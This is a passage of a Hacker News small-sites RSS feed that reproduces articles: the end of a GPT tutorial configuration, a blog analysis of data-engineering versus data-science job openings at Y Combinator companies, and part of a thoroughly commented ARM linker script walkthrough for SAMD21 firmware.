                <p>Use character level tokenizer</p>
            </div>
            <div>
                <div><pre><span>229</span>        <span>'tokenizer'</span><span>:</span> <span>'character'</span><span>,</span></pre></div>
            </div>
        </div>
    <div id="section-50">
            <div>
                
                <p>Prompt separator is blank</p>
            </div>
            <div>
                <div><pre><span>231</span>        <span>'prompt_separator'</span><span>:</span> <span>''</span><span>,</span></pre></div>
            </div>
        </div>
    <div id="section-51">
            <div>
                
                <p>Starting prompt for sampling</p>
            </div>
            
        </div>
    <div id="section-52">
            <div>
                
    …</div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lab-ml.com/labml_nn/transformers/gpt/">https://lab-ml.com/labml_nn/transformers/gpt/</a></em></p>]]>
            </description>
            <link>https://lab-ml.com/labml_nn/transformers/gpt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775925</guid>
            <pubDate>Thu, 14 Jan 2021 13:16:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We don't need data scientists, we need data engineers]]>
            </title>
            <description>
<![CDATA[
Score 692 | Comments 344 (<a href="https://news.ycombinator.com/item?id=25775872">thread link</a>) | @winkywooster
<br/>
January 14, 2021 | https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/ | <a href="https://web.archive.org/web/*/https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-reactid="11"><figure>
    
  <a href="https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-85f3f.jpg" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="world in data" title="" src="https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-c6823.jpg" srcset="https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-dad4f.jpg 240w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-1808a.jpg 480w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-c6823.jpg 960w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-e8e5f.jpg 1440w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-54793.jpg 1920w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-c4df6.jpg 2880w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-85f3f.jpg 4256w" sizes="(max-width: 960px) 100vw, 960px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>Data. It’s everywhere and we’re <a href="https://techjury.net/blog/how-much-data-is-created-every-day/#gref">only getting more of it</a>. For the last 5-10 years, <em>data science</em> has attracted newcomers near and far trying to get a taste of that forbidden fruit. </p>
<p>But what does the state of <em>data science</em> hiring look like today?</p>
<p>Here’s the gist of the article in two-sentences for the busy reader.</p>
<p><strong>TLDR</strong>: There are <strong>70% more open roles</strong> at companies in <em>data engineering</em> as compared to <em>data science</em>. As we train the next generation of data and machine learning practitioners, let’s place more emphasis on engineering skills.</p>
<hr>
<p>As part of my work developing an <a href="https://www.confetti.ai/">educational platform</a> for data professionals, I think a lot about how the market for data-driven (machine learning and data science) roles is evolving. </p>
<p>In talking to dozens of prospective entrants to data fields including students at top institutions around the world, I’ve seen a tremendous amount of confusion around what skills are most important to help candidates stand out in the crowd and prepare for their careers. </p>
<p>When you think about it, a <em>data scientist</em> can be responsible for any subset of the following: machine learning modelling, visualization, data cleaning and processing (i.e. SQL wrangling), engineering, and production deployment. </p>
<p>How do you even begin to recommend a study curriculum for newcomers?</p>
<p>Data speaks louder than words. So I decided to do an analysis of the data roles being hired for at every company coming out of <a href="https://www.ycombinator.com/">Y-Combinator</a> since 2012. The questions that guided my research:</p>
<ul>
<li>What data roles are companies most frequently hiring for?</li>
<li>How in-demand is the conventional <em>data scientist</em> that we talk about so much?</li>
<li>Are the same skills that started the data revolution relevant today?</li>
</ul>
<p>If you want the full details and analysis, read on. </p>
<h2>Methodology</h2>
<p>I chose to do an analysis of YC portfolio companies that claim to make some sort of data work part of their value proposition. </p>
<p>Why focus on YC? Well, for starters, they do a good job of providing an easily searchable (and scrapable) <a href="https://www.ycombinator.com/companies/">directory of their companies</a>. </p>
<p>In addition, as a particularly forward-thinking incubator that has funded companies from around the world across domains for over a decade, I felt they provided a representative sample of the market with which to conduct my analyses. That being said, take what I say wit a grain of salt, as I didn’t analyze super-large tech companies.</p>
<p>I scraped the homepage URLs of every YC company since 2012, producing an initial pool of ~1400 companies. </p>
<p>Why stop at 2012? Well, 2012 was the year that <a href="https://en.wikipedia.org/wiki/AlexNet">AlexNet</a> won the ImageNet competition, effectively kickstarting the machine learning and data-modelling wave we are now living through. It’s fair to say that this birthed some of the earliest generations of data-first companies.</p>
<p>From this initial pool, I performed keyword filtering to reduce the number of relevant companies I would have to look through. In particular, I only considered companies whose websites included at least one of the following terms: AI, CV, NLP, natural language processing, computer vision, artificial intelligence, machine, ML, data. I also disregarded companies whose website links were broken. </p>
<p>Did this generate a ton of false positives? Absolutely! But here I was trying to prioritize high recall as much as possible, recognizing that I would do a more fine-grained manual inspection of the individual websites for relevant roles.</p>
<p>With this reduced pool, I went through every site, found where they were advertising jobs (typically a <em>Careers</em>, <em>Jobs</em>, or <em>We’re Hiring</em> page), and took note of every role that included data, machine learning, NLP, or CV in the title. This gave me a pool of about 70 distinct companies hiring for data roles. </p>
<p>One note here: it’s conceivable that I missed some companies as there were certain websites with very little information (typically those in stealth) that might actually be hiring. In addition, there were companies that didn’t have a formal <em>Careers</em> page but asked that prospective candidates reach out directly via email. </p>
<p>I disregarded both of these types of companies rather than reach out to them, so they are not part of this analysis.</p>
<p>Another thing: the bulk of this research was done towards the final weeks of 2020. Open roles may have changed as companies update their pages periodically. However, I don’t believe this will drastically impact the conclusions drawn. </p>
<h2>What Are Data Practitioners Responsible For?</h2>
<p>Before diving into the results, it’s worth spending some time clarifying what responsibilities each data role is typically responsible for. Here are the four roles we will spend our time looking at with a short description of what they do:</p>
<ul>
<li><em>Data scientist</em>: Use various techniques in statistics and machine learning to process and analyse data. Often responsible for building models to probe what can be learned from some data source, though often at a prototype rather than production level. </li>
<li><em>Data engineer</em>: Develops a robust and scalable set of data processing tools/platforms. Must be comfortable with SQL/NoSQL database wrangling and building/maintaining ETL pipelines.</li>
<li><em>Machine Learning (ML) Engineer</em>: Often responsible for both training models and productionizing them. Requires familiarity with some high-level ML framework and also must be comfortable building scalable training, inference, and deployment pipelines for models.</li>
<li><em>Machine Learning (ML) Scientist</em>: Works on cutting-edge research. Typically responsible for exploring new ideas that can be published at academic conferences. Often only needs to prototype new state-of-the-art models before handing off to ML engineers for productionization.</li>
</ul>
<h2>How Many Data Roles Are There?</h2>
<p>So what happens when we plot the frequency of each data role that companies are hiring for? The plot looks  like this:</p>
<figure>
    
  <a href="https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-7931f.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="all machine learning, data science, data engineering roles at Y-Combinator companies" title="" src="https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-3d61e.png" srcset="https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-d182c.png 240w,
https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-5220f.png 480w,
https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-3d61e.png 960w,
https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-7931f.png 985w" sizes="(max-width: 960px) 100vw, 960px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>What immediately stands out is how many more open <em>data engineer</em> roles there are compared to traditional <em>data scientists</em>. In this case, the raw counts correspond to companies hiring <strong>roughly 55% more</strong> for data engineers than data scientists, and roughly the same number of machine learning engineers as data scientists.</p>
<p>But we can do more. If you look at the titles of the various roles, there seems to be some repetition. </p>
<p>Let’s only provide coarse-grained categorization through role consolidation. In other words, I took roles whose descriptions were roughly equivalent and consolidated them under a single title. </p>
<p>That included the following set of equivalence relations: </p>
<ul>
<li><em>NLP engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>CV engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>ML engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Deep Learning engineer</em> (while the domains might be different, the responsiblities are roughly the same)</li>
<li><em>ML scientist</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Deep Learning researcher</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>ML intern</em> (the internship description very much seemed research-focused)</li>
<li><em>Data engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Data architect</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Head of data</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Data platform engineer</em></li>
</ul>
<figure>
    
  <a href="https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-7931f.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="all machine learning, data science, data engineering roles at Y-Combinator companies consolidated into coarse categories" title="" src="https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-3d61e.png" srcset="https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-d182c.png 240w,
https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-5220f.png 480w,
https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-3d61e.png 960w,
https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-7931f.png 985w" sizes="(max-width: 960px) 100vw, 960px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>If we don’t like dealing with raw counts, here are some percentages to put us at ease:</p>
<figure>
    
  <a href="https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-7931f.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="all machine learning, data science, data engineering roles at Y-Combinator companies normalized frequencies" title="" src="https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-3d61e.png" srcset="https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-d182c.png 240w,
https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-5220f.png 480w,
https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-3d61e.png 960w,
https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-7931f.png 985w" sizes="(max-width: 960px) 100vw, 960px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>I probably could have lumped <em>ML research engineer</em> into one of the <em>ML scientist</em> or <em>ML engineer</em> bins, but given that it was a bit of a hybrid role, I left it as is. </p>
<p>Overall the consolidation made the differences even more pronounced! There are <strong>~70%</strong> more open <em>data engineer</em> than <em>data scientist</em> positions. In addition, there are <strong>~40%</strong> more open <em>ML engineer</em> than <em>data scientist</em> positions. There are also only <strong>~30%</strong> as many <em>ML scientist</em> as <em>data scientist</em> positions. </p>
<h2>Takeaways</h2>
<p><em>Data engineers</em> are in increasingly high demand compared to other data-driven professions. In a sense, this represents an evolution for the broader field. </p>
<p>When machine learning become hot 🔥 5-8 years ago, companies decided they need people that can make classifiers on data. But then frameworks like <a href="https://www.tensorflow.org/">Tensorflow</a> and <a href="https://pytorch.org/">PyTorch</a> became really good, democratizing the ability to get started with deep learning and machine learning. </p>
<p>This commoditized the data modelling skillset. </p>
<p>Today, the bottleneck in helping companies get machine learning and modelling insights to production center on data problems. </p>
<p>How do you annotate data? How do you process and clean data? How do you move it from A to B? How do you do this every day as quickly as possible?</p>
<figure>
    
  <a href="https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-321c9.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="patrick star moving data" title="" src="https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-321c9.png" srcset="https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-8c52f.png 240w,
https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-0f208.png 480w,
https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-321c9.png 720w" sizes="(max-width: 720px) 100vw, 720px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>All that amounts to having good engineering skills. </p>
<p>This may sound boring and unsexy, but old-school software engineering with a bend toward data may be what we really need right now. </p>
<p>For years, we’ve become enamored with the idea of data professionals that breathe life into raw data thanks to cool demos and media hype. After all, when was the last time you saw a <a href="https://techcrunch.com/">TechCrunch</a> article about an ETL pipeline? </p>
<p>If nothing else, I believe solid engineering is something we don’t emphasize enough in data science job training or educational programs. In addition to learning how to use <em>linear_regression.fit()</em>, learn how to write a unit test too!</p>
<p>So does that mean you shouldn’t study data science? No. </p>
<p>What it means is that competition is going to be tougher. There are going to be fewer positions available for what is looking to be an abundance of newcomers to the market trained to do data science. </p>
<p>There will always be a need for people that can effectively analyze and extract actionable insights from data. But they have to be good. </p>
<p>Downloading a pretrained model off the Tensorflow website on the <a href="https://scikit-learn.org/stable/auto_examples/datasets/plot_iris_dataset.html">Iris dataset</a> probably is no longer enough to get that data science job. </p>
<p>It’s clear, however, with the large number of <em>ML engineer</em> openings that companies often want a hybrid data practitioner: someone that can build and deploy models. Or said more succinctly, someone that can use Tensorflow but can also build it from source.</p>
<p>Another takeaway here is that there just aren’t that many ML research positions. </p>
<p>Machine learning research tends to get its fair share of hype because that’s where all the cutting-edge stuff happens, all the <a href="https://deepmind.com/research/case-studies/alphago-the-story-so-far">AlphaGo</a> and <a href="https://openai.com/blog/openai-api/">GPT-3</a> and what-not. </p>
<p>But for …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/">https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/</a></em></p>]]>
            </description>
            <link>https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775872</guid>
            <pubDate>Thu, 14 Jan 2021 13:09:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The most thoroughly commented linker script (probably)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25775854">thread link</a>) | @signa11
<br/>
January 14, 2021 | https://blog.thea.codes/the-most-thoroughly-commented-linker-script/ | <a href="https://web.archive.org/web/*/https://blog.thea.codes/the-most-thoroughly-commented-linker-script/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>While developing the firmware for Winterbloom's <a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux">Castor &amp; Pollux</a>, I got very curious as to just what the Microchip/Atmel-provided linker script was doing.</p>
<p>If you've never heard of or seen a linker script before you're not alone. Most of us never even have to think about them, however, on memory constained embedded devices it's not uncommon to need to modify the default linker script.</p>
<p>The linker script controls how <code>ld</code> combines all of your <code>.o</code> files into a single <code>.elf</code> and how that resulting <code>.elf</code> file gets loaded by the target processor.</p>
<p>So I was staring at this script that made absolutely no sense to me. It's filled with incantations and mysterious symbols and there's no indication of what they're for or where they come from.</p>
<p>So I did a <strong>lot</strong> of research and now I can present to you <strong>the most thoroughly commented linker script</strong><sup id="fnref:probably"><a href="#fn:probably">1</a></sup>.</p>
<p>You can see this script in its entirety, comments and all, on <a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux/blob/master/firmware/scripts/samd21g18a.ld">GitHub</a>. But if you'd like to read it here instead it's transcribed below.</p>
<h2 id="output-format">Output format</h2>
<p>Output format sets the ELF output format to use a specific BFD backend.</p>
<p>The first is the default BFD. The second and third arguments are used
when big (-EB) or little (-EL) endian is requested.</p>
<p>Since the SAM D series are configured with only little endian support,
"elf32-littlearm" is used across the board. This option seems to be
included by Atmel/Microchip out of an abundance of caution, as
arm-none-eabi-ld will do the right thing and use "elf32-littlearm" by
default.</p>
<p>The list of acceptable values can be obtained using <code>objdump -i</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://sourceware.org/binutils/docs/ld/Format-Commands.html#Format-Commands">https://sourceware.org/binutils/docs/ld/Format-Commands.html#Format-Commands</a></li>
<li><a href="https://sourceware.org/binutils/docs/ld/BFD.html">https://sourceware.org/binutils/docs/ld/BFD.html</a></li>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
    Section 11.1.11, Cortex M0+ Configuration</li>
</ul>
<pre><span>OUTPUT_FORMAT</span><span>(</span><span>"elf32-littlearm"</span><span>,</span> <span>"elf32-littlearm"</span><span>,</span> <span>"elf32-littlearm"</span><span>)</span>
</pre>
<h2 id="cpu-memory-configuration-variables">CPU memory configuration variables</h2>
<p>These variables are used by the following "MEMORY" command to define
the various memory spaces.</p>
<p>For the SAMD21G18A used by this project, the available Flash is
262kB and the available SRAM is 32kB.</p>
<p>This project also reserves 8kB for the bootloader and 1kB for
"non-volatile memory" (NVM) - which is used by the application
to store calibration and user settings.</p>
<p>References:</p>
<ul>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
    Section 10.2, Physical Memory Map</li>
</ul>
<pre><span>FLASH_SIZE</span> <span>=</span> <span>0x40000</span><span>;</span>      <span>/* 256kB */</span>
<span>BOOTLOADER_SIZE</span> <span>=</span> <span>0x2000</span><span>;</span>  <span>/* 8kB */</span>
<span>NVM_SIZE</span> <span>=</span> <span>0x400</span><span>;</span>          <span>/* 1kbB */</span>
<span>SRAM_SIZE</span> <span>=</span> <span>0x8000</span><span>;</span>        <span>/* 32kB */</span>
</pre>
<p>ARM Cortex-M processors use a descending stack and generally
require stack space to be set aside in RAM.</p>
<p>The application's behavior determines just how much stack space
should be reserved. I generally start with 2kB (0x800) of
stack space for Cortex-M0+ projects programmed in C .</p>
<p>You can analyze stack usage in GCC using the <code>-fstack-usage</code>
flag and you can enable compiler warnings for stack usage
with <code>-Wstack-usage=STACK_SIZE</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://embeddedartistry.com/blog/2020/08/17/three-gcc-flags-for-analyzing-memory-usage/">https://embeddedartistry.com/blog/2020/08/17/three-gcc-flags-for-analyzing-memory-usage/</a></li>
<li><a href="https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/how-much-stack-memory-do-i-need-for-my-arm-cortex--m-applications">https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/how-much-stack-memory-do-i-need-for-my-arm-cortex--m-applications</a></li>
<li><a href="https://gcc.gnu.org/onlinedocs/gnat_ugn/Static-Stack-Usage-Analysis.html">https://gcc.gnu.org/onlinedocs/gnat_ugn/Static-Stack-Usage-Analysis.html</a></li>
<li><a href="https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html">https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html</a></li>
</ul>
<pre><span>STACK_SIZE</span> <span>=</span> <span>DEFINED</span><span>(</span><span>__stack_size__</span><span>)</span> <span>?</span> <span>__stack_size__</span> <span>:</span> <span>0x800</span><span>;</span>
</pre>
<h2 id="memory-space-definition">Memory space definition</h2>
<p>This section declare blocks of memories for specific purposes. Since an
ARM's address space is generally split between Flash, SRAM, peripherals,
and other regions, it's necessary to tell the linker where different
types of data can go in the address space.</p>
<p>These blocks will be used in the <code>SECTIONS</code> command below.</p>
<p>References:</p>
<ul>
<li><a href="https://sourceware.org/binutils/docs/ld/MEMORY.html#MEMORY">https://sourceware.org/binutils/docs/ld/MEMORY.html#MEMORY</a></li>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
    Section 10.2, Physical Memory Map</li>
</ul>
<pre><span>MEMORY</span>
<span>{</span>
</pre>
<p>Start with the Flash memory region. On the SAMD21, Flash starts at
the beginning of the address space (<code>0x00000000</code>) and is contiguous
right up to the size of the Flash. Flash is marked a <code>rx</code> so
that the linker knows that this space is read-only (<code>r</code>) and
executable (<code>x</code>).</p>
<p>The "bootloader" section allows this firmware to work with the uf2
bootloader. The bootloader takes the first 0x2000 bytes of flash
memory.</p>
<p>References:</p>
<ul>
<li><a href="https://github.com/adafruit/uf2-samdx1#configuration">https://github.com/adafruit/uf2-samdx1#configuration</a></li>
</ul>
<pre>    <span>bootloader</span> <span>(</span><span>rx</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>0x00000000</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>BOOTLOADER_SIZE</span>
</pre>
<p>Following the bootloader is the flash memory used by the application,
called "rom" here - even though it's flash, the name is just a name
and doesn't carry special meaning.</p>
<p>The total length of the rom block is the MCU's flash size minus the
bootloader's size and any space reserved for "non-volatile memory"
by the application.</p>
<pre>   <span>rom</span> <span>(</span><span>rx</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>0x00002000</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>FLASH_SIZE</span> <span>-</span> <span>BOOTLOADER_SIZE</span> <span>-</span> <span>NVM_SIZE</span>
</pre>
<p>The "nvm" block is space set aside for the application to store
user settings and calibration data in the MCU's flash.</p>
<p>The block is located right at the end of the flash space. This
is useful because it means that it says in a fixed location
regardless of how much flash space the application takes up
in "rom". Explicitly defining this section also lets the
linker ensure that application code doesn't overwrite the
data in this region.</p>
<p>This block is marked as read-only (<code>r</code>) because flash can not
be written in the same way as normal memory, however, the
application can use the SAMD's NVM peripheral to write data in
this region.</p>
<pre>   <span>nvm</span> <span>(</span><span>r</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>FLASH_SIZE</span> <span>-</span> <span>NVM_SIZE</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>NVM_SIZE</span>
</pre>
<p>The "ram" block is mapped to the CPU's SRAM and it's where
the stack, heap, and all variables will go.</p>
<p>For the SAMD21, SRAM starts at 0x20000000 and is contiguous
for the size of the SRAM.</p>
<pre>   <span>ram</span> <span>(</span><span>rwx</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>0x20000000</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>SRAM_SIZE</span>
<span>}</span>
</pre>
<h2 id="sections">Sections</h2>
<p>The sections command tells the linker how to combine the
input files into an output ELF and where segments belong
in memory.</p>
<p>The linker takes a set of input files containing the "input
sections" and uses this to map them to "output sections"
which are placed in the output ELF file.</p>
<p>While the most important sections to think about here
are the ones that'll be placed into the memory (segments)
some sections are just placed in the output ELF for debugging.</p>
<p>References:</p>
<ul>
<li><a href="https://sourceware.org/binutils/docs/ld/SECTIONS.html#SECTIONS">https://sourceware.org/binutils/docs/ld/SECTIONS.html#SECTIONS</a></li>
</ul>
<pre><span>SECTIONS</span>
<span>{</span>
</pre>
<p>The text segment contains program code and read-only data.</p>
<p>References:</p>
<ul>
<li><a href="https://developer.arm.com/documentation/dui0101/a/">https://developer.arm.com/documentation/dui0101/a/</a>
Page 5, Segments</li>
<li><a href="http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections">http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections</a></li>
</ul>
<pre>   <span>.</span><span>text</span> <span>:</span>
   <span>{</span>
</pre>
<p>This segment must be 4-byte aligned as defined in ARM ELF
File Format specification.</p>
<pre>      <span>.</span> <span>=</span> <span>ALIGN</span><span>(</span><span>4</span><span>);</span>
</pre>
<p>The vector table defines the initial stack pointer and
interrupt/exception routines for the ARM CPU and device
peripherals. Every Cortex-M project needs this.</p>
<p>For the SAM D series the vector table is expected
to be at address 0x00000000 after reset. Since
flash memory starts at 0x00000000, the first values
in flash should be the vector table.</p>
<p>When defining the vector table in code you must use
<code>__attribute__ ((section(".vectors")))</code> to tell
GCC to place the vector table into the section
named ".vectors" in the input object file so that
the linker can find it.</p>
<p>Note that since this project uses the UF2 bootloader,
this actually gets placed at the beginning of the
program's flash area (0x2000). The Cortex-M allows
changing the vector table after initialization,
so the startup script sets the Vector Table Offset
Register (<code>SCB-&gt;VTOR</code>) to <code>_sfixed</code> during its
intialization. The <code>_efixed</code> symbol is unused but
included for completeness.</p>
<p>References:</p>
<ul>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
Secion 8.3.3, Fetching of Initial Instructions</li>
<li><a href="https://static.docs.arm.com/ddi0403/eb/DDI0403E_B_armv7m_arm.pdf">https://static.docs.arm.com/ddi0403/eb/DDI0403E_B_armv7m_arm.pdf</a>
Section B1.5.3, The vector table
Section B3.2.5, Vector Table Offset Register, VTOR</li>
<li><a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux/tree/master/firmware/third_party/samd21/gcc/gcc/startup_samd21.c">startup_samd21.c</a></li>
</ul>
<pre>      <span>_sfixed</span> <span>=</span> <span>.;</span>
      <span>KEEP</span><span>(</span><span>*</span><span>(.</span><span>vectors</span> <span>.</span><span>vectors</span><span>.</span><span>*</span><span>))</span>
</pre>
<p>Include code and read-only data sections from all
input files.</p>
<p>By default, GCC places all program code into a section named
".text" and read-only data (such as const static variables) into
a section named ".rodata" in the input object files. This naming
convention is from the ELF ABI specification.</p>
<p>GCC generates three "flavors" of sections in object files:</p>
<ul>
<li><code>.{section}</code>: the basic section.</li>
<li><code>.{section}.*</code>: sections generated by <code>-ffunction-sections</code> and
<code>-fdata-sections</code> so that each function/data has a unique
section.</li>
<li><code>.gnu.linkonce.{type}.*</code>: sections generated by GCC so the
linker can remove duplicates. Seems to be related to
Vague Linking.</li>
</ul>
<p>References:</p>
<ul>
<li><a href="http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections">http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections</a></li>
<li><a href="https://gcc.gnu.org/onlinedocs/gcc/Vague-Linkage.html">https://gcc.gnu.org/onlinedocs/gcc/Vague-Linkage.html</a></li>
<li><a href="https://stackoverflow.com/questions/5518083/what-is-a-linkonce-section">https://stackoverflow.com/questions/5518083/what-is-a-linkonce-section</a></li>
</ul>
<pre>      <span>*</span><span>(.</span><span>text</span> <span>.</span><span>text</span><span>.</span><span>*</span> <span>.</span><span>gnu</span><span>.</span><span>linkonce</span><span>.</span><span>t</span><span>.</span><span>*</span><span>)</span>
      <span>*</span><span>(.</span><span>rodata</span> <span>.</span><span>rodata</span><span>*</span> <span>.</span><span>gnu</span><span>.</span><span>linkonce</span><span>.</span><span>r</span><span>.</span><span>*</span><span>)</span>
</pre>
<h2 id="c-c-runtime-support">C &amp; C++ runtime support</h2>
<p>The following sections are for the C/C++ runtime. These are generally used by crt0.</p>
<p>References:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Crt0">https://en.wikipedia.org/wiki/Crt0</a></li>
</ul>
<h3 id="initializers">Initializers</h3>
<ul>
<li>C++ Runtime: initializers for static variables.</li>
<li>C Runtime: designated constructors</li>
</ul>
<p>For C++, handles variables at file scope like this:</p>
<pre><span>int</span> <span>f</span> <span>=</span> <span>some_func</span><span>()</span>
</pre>
<p>For C, handles functions designated as constructors:</p>
<pre><code>void intialize_thing(void) __attribute__((constructor));
</code></pre>
<p>Executed by the C runtime at startup via <code>__libc_init_array</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://github.com/gcc-mirror/gcc/blob/master/libgcc/crtstuff.c">https://github.com/gcc-mirror/gcc/blob/master/libgcc/crtstuff.c</a></li>
<li><a href="https://sourceware.org/git/?p=newlib-cygwin.git;a=blob;f=newlib/libc/misc/init.c">https://sourceware.org/git/?p=newlib-cygwin.git;a=blob;f=newlib/libc/misc/init.c</a>;</li>
<li><a href="https://gcc.gnu.org/onlinedocs/gccint/Initialization.html">https://gcc.gnu.org/onlinedocs/gccint/Initialization.html</a></li>
